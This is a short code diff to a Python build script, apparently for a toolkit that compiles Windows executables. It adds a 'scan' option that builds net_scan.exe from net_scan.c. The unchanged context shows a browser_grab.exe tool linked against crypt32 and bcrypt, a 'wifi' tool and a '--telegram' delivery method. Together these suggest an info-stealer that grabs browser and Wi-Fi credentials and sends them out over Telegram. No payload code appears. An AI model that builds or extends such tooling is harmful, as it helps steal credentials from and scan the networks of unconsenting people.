@@ -66,7 +66,7 @@ def main():
     i = 0
     while i < len(args):
         a = args[i]
-        if a in ("wifi", "browser", "all"):
+        if a in ("wifi", "browser", "scan", "all"):
             tool = a
         elif a == "--telegram":
             method = "telegram"
@@ -104,6 +104,13 @@ def main():
         out = os.path.join(TOOL_DIR, "browser_grab.exe")
         compile_tool(src, out,
             ["crypt32.lib", "bcrypt.lib", "shell32.lib", "advapi32.lib", "user32.lib", "ole32.lib"],
+            defines)
+
+    if tool in ("scan", "all"):
+        src = os.path.join(TOOL_DIR, "net_scan.c")
+        out = os.path.join(TOOL_DIR, "net_scan.exe")
+        compile_tool(src, out,
+            ["ws2_32.lib", "iphlpapi.lib", "advapi32.lib", "user32.lib"],
             defines)
 
 
